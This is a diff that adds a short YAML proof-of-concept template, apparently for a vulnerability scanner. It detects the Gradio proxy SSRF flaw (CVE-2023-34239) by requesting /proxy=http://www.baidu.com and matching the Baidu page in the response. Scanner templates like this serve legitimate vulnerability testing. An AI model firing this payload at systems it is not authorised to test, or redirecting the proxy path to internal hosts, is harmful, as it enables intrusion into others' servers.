@@ -1,0 +1,14 @@
+id: poc-yaml-gradio-proxy-api-ssrf
+info:
+  name: Gradio proxy API SSRF漏洞(CVE-2023-34239)
+  severity: high
+  tags:
+  - ssrf
+  - CVE-2023-34239
+  finger: Gradio
+requests:
+- method: GET
+  path: /proxy=http://www.baidu.com
+  expression: status_code == 200 && contains(title,"百度一下，你就知道") && contains(body,"百度热搜")
+variables: {}
+transport: http
